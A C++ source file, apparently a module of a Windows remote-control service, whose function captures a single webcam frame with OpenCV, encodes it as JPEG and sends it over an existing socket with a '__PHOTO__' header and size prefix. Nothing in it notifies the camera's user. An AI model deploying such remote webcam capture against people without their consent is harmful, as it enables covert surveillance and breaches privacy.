#include "../../lib/service.h"
#include <opencv2/opencv.hpp>
#include <vector>
#include <string>
#include <winsock2.h>

using namespace std;
using namespace cv;

void capture_photo(SOCKET conn) {
    VideoCapture cap(0, CAP_DSHOW);
    if (!cap.isOpened()) {
        string error = "__ERROR__Cannot open webcam.";
        send(conn, error.c_str(), error.size(), 0);
        return;
    }

    Mat frame;
    cap >> frame;

    if (frame.empty()) {
        string error = "__ERROR__Failed to capture image.";
        send(conn, error.c_str(), error.size(), 0);
        return;
    }

    // Encode ảnh thành định dạng JPG trong RAM
    vector<uchar> encoded;
    vector<int> params = { IMWRITE_JPEG_QUALITY, 90 };
    if (!imencode(".jpg", frame, encoded, params)) {
        string error = "__ERROR__Failed to encode image.";
        send(conn, error.c_str(), error.size(), 0);
        return;
    }

    // Gửi header nhận diện
    string header = "__PHOTO__";
    send(conn, header.c_str(), header.size(), 0);

    // Gửi kích thước ảnh (4 byte)
    uint32_t imgSize = static_cast<uint32_t>(encoded.size());
    send(conn, reinterpret_cast<char*>(&imgSize), sizeof(imgSize), 0);

    // Gửi toàn bộ ảnh
    send(conn, reinterpret_cast<char*>(encoded.data()), imgSize, 0);
}